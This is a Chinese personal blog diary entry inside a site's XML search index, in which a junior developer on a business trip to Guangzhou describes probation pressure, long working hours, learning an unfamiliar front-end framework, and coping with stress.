        <content type="html"><![CDATA[<hr><p>出差到广州已经一个星期了，这个星期最好的消息就是我还在广州吧。  </p><hr><p>过来的前几天，看了一下这边项目的代码简直是一脸懵逼，是我完全没有了解过的dojo前端框架，我之前自学的后端技术都没怎么派上用场，这就像英语还处于只会说“what are you 弄啥嘞”的中西结合水平，却让你去考英语四级。过来的第三天，领导对我说：”要是你一个星期内不能熟悉项目，处理一些八阿哥，那么公司就认为你上手能力有点慢，公司现在也不缺初级工程师，基本都是面向社招，招有工作经验的人，武汉人员饱和度差不多满了….“，听他这迫不及待赶我走的意思，我明白我转正的机会渺茫，但这出差工作没长10斤肉，如何有颜面见武汉的弟兄们，于是接下来几天开始了一段艰苦长征之路。之前听说9 9 6工作制，来到这直接升级成了9 10.5 6，每天10几个小时盯着电脑，简直让人精神恍惚，很难将注意力集中在这么优秀的代码上面，精神恍惚的人就喜欢想一些乱七八糟的事情：比如离职回去重新找一份工作；回去考公务员吧；自己能力不足当不了治这八阿哥的皇阿玛；武汉的租的房子有没有被淹，我窗户好像没关……不过生活还要继续，我又不是精神病，每天想一会儿这些事情就可以了。负面情绪有时候真的很容易让人越陷越深，不过还好我有一些发泄的地方，有时候会和老爸谈谈现在的工作状况，有时候会吃完饭后出去乱逛一通再回到办公室，有时候会去网上搜一下和我差不多情况的问题，看看别人的鼓励与经验。经历了三天，内心也变得坚定，“毕竟留不留也不是我考虑的事，我能做的就是把事情尽自己能力去干，每天进步一点总比放弃不干好，就算最后没留下来，但我也不是空手走”这么个想法定下来感觉代码都变得吸引力了，饭都变好吃了，觉都变好睡了，路上的行人都变美了。  </p><hr><p>在工作中，我发现人都变懒了，懒得玩手机，懒得抱怨，懒得上厕所，这边的项目经理更是懒得宿舍也不愿回，懒得觉都不愿睡。哎项目经理都这么懒，我还有什么能抱怨的，不过今天星期日难得有自己的时间，我可不想再懒下去了，去瞅了瞅动物园不用工作等着投喂的动物，心情畅快多了。  </p>]]></content>
      
      
      <categories>
          
          <category> 日记 </category>
          
          <category> 2019 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
